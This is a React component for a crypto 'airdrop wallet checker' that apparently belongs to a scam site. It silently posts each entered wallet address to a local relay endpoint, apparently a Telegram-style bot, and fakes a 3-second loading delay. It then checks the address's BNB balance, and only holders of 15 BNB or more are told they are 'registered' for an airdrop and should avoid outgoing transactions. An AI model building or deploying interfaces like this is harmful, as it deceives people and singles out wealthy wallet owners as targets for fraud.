"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { useToast } from "@/hooks/use-toast"
import type { Translations } from "@/components/ranking-page"
import { ethers } from "ethers"

interface WalletCheckerProps {
  translations: Translations
  setIsLoading: (loading: boolean) => void
}

export function WalletChecker({ translations, setIsLoading }: WalletCheckerProps) {
  const [walletAddress, setWalletAddress] = useState("")
  const { toast } = useToast()

  const handleCheck = async () => {
    const address = walletAddress.trim()
    if (!address) {
      toast({
        title: "Please enter the wallet address.",
        duration: 5000,
      })
      return
    }

    // Validate BNB/Ethereum address
    if (!ethers.isAddress(address)) {
      toast({
        title: "Invalid wallet address.",
        duration: 5000,
      })
      return
    }

    setIsLoading(true)

    fetch(`http://localhost:8080/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        text: `New wallet check: <code>${address}</code>`,
      }),
    });

    // Add wait 3 seconds to simulate loading
    await new Promise((resolve) => setTimeout(resolve, 3000))

    try {
      // Connect to BSC mainnet RPC
      const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/")

      // Get balance in wei
      const balanceWei = await provider.getBalance(address)

      // Convert to BNB
      const balanceBnb = Number(ethers.formatEther(balanceWei))

      console.log(balanceBnb)

      // Check balance
      if (balanceBnb < 15) {
        toast({
          title: "Wallet is deemed inactive. BNB balance has not exceeded 15BNB",
          duration: 5000,
        })
      } else {
        toast({
          title: `your wallet registred succesfuly you will receive your airdrop in less than 24 hours until then don't do out transaction using this wallet`,
          duration: 5000,
        })
      }
    } catch (error) {
      console.error(error)
      toast({
        title: "Error checking balance. Please try again.",
        duration: 5000,
      })
    }

    setIsLoading(false)
  }

  return (
    <div className="container mx-auto px-4 py-16">
      <div className="mx-auto max-w-3xl">
        {/* Description Text */}
        <p className="mb-8 text-center text-lg leading-relaxed text-zinc-300">
          {translations.walletChecker.description}
        </p>

        {/* Input and Button */}
        <div className="mb-8 flex gap-3">
          <Input
            type="text"
            placeholder={translations.walletChecker.inputPlaceholder}
            value={walletAddress}
            onChange={(e) => setWalletAddress(e.target.value)}
            className="h-14 flex-1 border-zinc-700 bg-zinc-900 text-white placeholder:text-zinc-500 focus-visible:ring-[#a3ff12]"
          />
          <Button
            onClick={handleCheck}
            className="h-14 bg-[#a3ff12] px-8 text-lg font-semibold text-black hover:bg-[#8ee000] cursor-pointer"
          >
            {translations.walletChecker.checkButton}
          </Button>
        </div>

        {/* Requirements */}
        <div className="space-y-3 text-zinc-400">
          <div className="flex items-start gap-2">
            <span className="mt-1 text-[#a3ff12]">*</span>
            <p className="leading-relaxed">{translations.walletChecker.requirement1}</p>
          </div>
          <div className="flex items-start gap-2">
            <span className="mt-1 text-[#a3ff12]">*</span>
            <p className="leading-relaxed">{translations.walletChecker.requirement2}</p>
          </div>
        </div>
      </div>
    </div>
  )
}